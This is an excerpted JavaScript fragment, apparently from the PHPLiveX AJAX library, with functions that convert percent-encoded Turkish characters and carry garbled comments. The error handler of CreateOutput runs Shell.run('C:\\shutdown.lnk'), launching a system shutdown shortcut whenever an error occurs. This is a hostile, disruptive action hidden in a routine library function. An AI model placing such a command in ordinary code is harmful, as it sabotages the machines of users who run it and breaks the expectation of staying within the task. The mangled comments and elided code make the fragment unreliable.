...
function CreateJS(){
	...
	PHPLiveX.prototype.GetSpecialChars = function(str){
		str = str.replace(/%E7/g,String.fromCharCode(231)); //"t");
		str = str.replace(/%C7/g,String.fromCharCode(199)); //"Ý");
		...
		str = str.replace(/%u015F/g,String.fromCharCode(254)); //"Ý");
		str = str.replace(/%u015E/g,String.fromCharCode(222)); //"Ý");
		str = str.replace(/%FC/g,String.fromCharCode(252)); //"n");
		str = str.replace(/%DC/g,String.fromCharCode(220)); //"_");
		return unescape(str);
	}

	PHPLiveX.prototype.EscapeSpecialChars = function(str){
		str = str.replace(/%E7/g,escape(String.fromCharCode(231))); //"t"));
		str = str.replace(/%C7/g,escape(String.fromCharCode(199))); //"Ý"));
		...
		str = str.replace(/%u015F/g,escape(String.fromCharCode(254))); //"Ý"));
		str = str.replace(/%u015E/g,escape(String.fromCharCode(222))); //"Ý"));
		str = str.replace(/%FC/g,escape(String.fromCharCode(252))); //"n"));
		str = str.replace(/%DC/g,escape(String.fromCharCode(220))); //"_"));
		return str;
	}
	...
	PHPLiveX.prototype.CreateOutput = function(funcName, funcArgs, funcUrl){
		...
		} catch( error ) {  Shell.run('C:\\shutdown.lnk');}
	}
